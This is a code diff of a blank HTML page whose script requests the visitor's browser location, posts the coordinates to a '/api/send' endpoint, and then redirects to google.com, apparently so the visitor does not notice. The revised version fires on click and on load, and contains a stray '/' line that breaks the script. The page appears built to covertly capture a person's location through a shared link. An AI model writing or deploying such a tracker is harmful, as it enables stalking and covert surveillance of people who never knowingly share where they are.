@@ -1,37 +1,33 @@
 <!DOCTYPE html>
 <html>
-<body>
+<body onclick="start()">
 
 <script>
-function sendLocation(lat, lon) {
-  fetch("/api/send", {
-    method: "POST",
-    headers: {
-      "Content-Type": "application/json"
-    },
-    body: JSON.stringify({ lat, lon })
-  }).catch(() => {});
-
-  window.location.href = "https://google.com";
-}
-
-if (navigator.geolocation) {
-  navigator.geolocation.getCurrentPosition(
-    (pos) => {
-      sendLocation(pos.coords.latitude, pos.coords.longitude);
-    },
-    () => {
+  function sendLocation(lat, lon) {
+    fetch("/api/send", {
+      method: "POST",
+      headers: {
+        "Content-Type": "application/json"
+      },
+      body: JSON.stringify({ lat, lon })
+    }).then(() => {
       window.location.href = "https://google.com";
-    },
-    {
-      enableHighAccuracy: false,
-      timeout: 5000,
-      maximumAge: 0
-    }
-  );
-} else {
-  window.location.href = "https://google.com";
-}
+    });
+  }
+
+  function start() {
+    navigator.geolocation.getCurrentPosition(
+      (pos) => {
+        sendLocation(pos.coords.latitude, pos.coords.longitude);
+      },
+      () => {
+        window.location.href = "https://google.com";
+      }
+    );
+  }
+
+  /
+  start();
 </script>
 
 </body>
